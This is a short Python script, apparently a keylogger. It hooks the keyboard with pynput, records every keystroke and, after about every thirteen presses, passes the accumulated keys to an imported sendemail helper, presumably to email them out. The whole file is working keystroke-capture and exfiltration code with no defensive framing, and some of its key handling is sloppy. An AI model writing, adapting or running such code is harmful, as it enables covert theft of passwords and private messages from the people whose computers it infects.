from pynput.keyboard import Key, Listener
import sendemail


keys = []
count = 0

def on_press(key):
    print(key, end=" ")
    print("Pressed")
    global keys,count
    keys.append(str(key)+'\n')
    count+=1
    if count > 12:
        count = 0
        email(keys)

def email(keys):
    message=''
    for key in keys:
        k = key.replace("'","")
        if key == Key.space:
            k = " "
        elif key.find("Key") > 0:
            k=""

        message+=k
    print(message)  
    sendemail.myEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as L:
    L.join()